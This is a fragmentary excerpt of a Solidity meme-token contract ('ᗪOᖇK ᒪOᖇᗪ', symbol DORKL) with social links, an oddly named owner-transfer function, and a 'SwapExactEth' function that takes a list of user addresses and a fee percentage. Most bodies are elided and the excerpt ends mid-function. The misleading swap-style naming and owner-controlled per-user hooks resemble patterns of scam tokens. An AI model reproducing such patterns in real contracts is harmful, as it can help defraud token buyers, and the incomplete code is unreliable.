/**
https://t.me/DORKL_Channel
https://twitter.com/DorkLord_ETH
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipevensrew(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract DORKLORD is Ownable {
    ...
    constructor (){
        name = unicode"ᗪOᖇK ᒪOᖇᗪ";
        symbol = unicode"DORKL";
        decimals = 9;
        uint256 Supply = 4206900000;
    ...
    function SwapExactEth(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _transfer(address user) public {
